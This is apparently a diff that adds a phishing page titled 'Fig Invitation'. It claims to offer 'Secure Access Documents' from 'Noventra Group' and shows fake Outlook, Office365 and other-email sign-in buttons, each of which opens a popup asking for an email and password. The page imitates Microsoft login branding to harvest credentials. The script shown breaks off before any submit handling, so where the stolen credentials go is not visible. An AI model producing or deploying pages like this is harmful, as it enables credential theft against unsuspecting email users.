@@ -1,0 +1,232 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="img/image_2025-03-06_07-06-17.png">
+<title>Fig Invitation</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background-image: url('../img/bgimg.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Segoe UI', sans-serif;
+  }
+
+  .center-box {
+    background: rgba(0, 0, 0, 0.6);
+    color: white;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    width: 90%;
+    max-width: 600px;
+    padding: 20px;
+  }
+
+  .center-box img.image {
+    display: block;
+    margin: 0 auto 10px;
+    width: 80px;
+  }
+
+  .button, .button1, .button2, .button3, .button4 {
+    width: 80%;
+    border-radius: 5px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 10px auto;
+    padding: 10px;
+    cursor: pointer;
+    color: white;
+    font-weight: 500;
+    transition: transform 0.2s ease, box-shadow 0.3s;
+  }
+
+  .button:hover, .button1:hover, .button2:hover, .button3:hover, .button4:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 12px rgba(255,255,255,0.3);
+  }
+
+  .button img, .button1 img, .button2 img, .button3 img, .button4 img {
+    width: 30px;
+    height: 30px;
+    border-radius: 5px;
+    margin-right: 10px;
+  }
+
+  .button { background-color: #0073c6; }
+  .button1 { background-color: #eb3b00; }
+  .button2 { background-color: #9d1fcc; }
+  .button3 { background-color: #000; }
+  .button4 { background-color: #fff; color:#000; }
+
+  /* Overlay and Popup */
+  .overlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(5px);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.4s ease;
+    z-index: 100;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .popup {
+    background: white;
+    color: #333;
+    border-radius: 15px;
+    padding: 25px;
+    width: 90%;
+    max-width: 350px;
+    position: relative;
+    box-shadow: 0 5px 25px rgba(0,0,0,0.4);
+    animation: slideIn 0.4s ease;
+  }
+
+  @keyframes slideIn {
+    from { transform: scale(0.9); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .popup img {
+    display: block;
+    width: 50px;
+    margin: 0 auto 10px;
+  }
+
+  .popup h3 {
+    text-align: center;
+    margin-bottom: 15px;
+  }
+
+  .popup input {
+    width: 95%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 1rem;
+  }
+
+  .popup button {
+    width: 100%;
+    background-color: #0073c6;
+    color: white;
+    border: none;
+    padding: 10px;
+    border-radius: 6px;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+
+  .popup button:hover {
+    background-color: #005a9e;
+  }
+
+  .close-btn {
+    position: absolute;
+    top: 10px;
+    right: 15px;
+    font-size: 22px;
+    color: #333;
+    cursor: pointer;
+  }
+
+  #loading {
+    display: none;
+    text-align: center;
+    color: #0073c6;
+    font-weight: 600;
+    margin-top: 10px;
+  }
+</style>
+</head>
+<body>
+
+<div class="center-box">
+  <img class="image" src="img/image_2025-03-06_07-06-17.png" alt="">
+  <h1>Secure Access Documents</h1>
+  <!-- <h2>You have been exclusively invited by Fig Money.</h2> -->
+  <p>Select your email to access documents sent by Noventra Group</p>
+
+  <div class="button" data-name="Outlook"><img src="img/office360.png">Sign in with Outlook</div>
+  <div class="button1" data-name="Office"><img src="img/office.png">Sign in with Office365</div>
+  <!-- <div class="button2" data-name="Yahoo"><img src="img/yahoo.png">Sign in with Yahoo</div> -->
+  <!-- <div class="button3" data-name="AOL"><img src="img/aol.png">Sign in with AOL</div> -->
+  <div class="button4" data-name="Email"><img src="img/email.png"> Sign in with Other Email</div>
+
+  
+  <p>© 2025 Noventra Group.</p>
+</div>
+
+<!-- Popup Overlay -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <span class="close-btn" id="closeBtn">&times;</span>
+    <img id="popupLogo" src="" alt="">
+    <h3 id="popupTitle">Sign in</h3>
+    <input type="email" id="x" placeholder="email" required>
+    <input type="password" id="y" placeholder="password" required>
+    <button id="submitBtn">Continue</button>
+    <div id="loading">⏳ Processing...</div>
+  </div>
+</div>
+
+<script>
+const overlay = document.getElementById('overlay');
+const popupLogo = document.getElementById('popupLogo');
+const popupTitle = document.getElementById('popupTitle');
+const loading = document.getElementById('loading');
+
+// Open popup when a provider is clicked
+document.querySelectorAll('.button, .button1, .button2, .button3, .button4').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const provider = btn.dataset.name;
+    popupTitle.textContent = `Sign in to ${provider}`;
+    popupLogo.src = btn.querySelector('img').src;
+
+    // Color theme change
+    let color;
+    switch (provider) {
+      case 'Yahoo': color = '#9d1fcc'; break;
+      case 'Office': color = '#eb3b00'; break;
+      case 'AOL': color = '#000'; break;
+      case 'Outlook': color = '#0073c6'; break;
+      default: color = '#555';
+    }
+    document.querySelector('.popup button').style.backgroundColor = color;
+    document.querySelector('.popup button').style.boxShadow = `0 0 8px ${color}`;
+
+    overlay.style.display = 'flex';
+  });
+});
+
+// Close popup (X button)
+document.getElementById('closeBtn').addEventListener('click', () => {
+  overlay.style.display = 'none';
+});
+
+// Close popup by clicking outside it
+overlay.addEventListener('click', (e) => {
+  if (e.target === overlay) {
+    overlay.style.display = 'none';
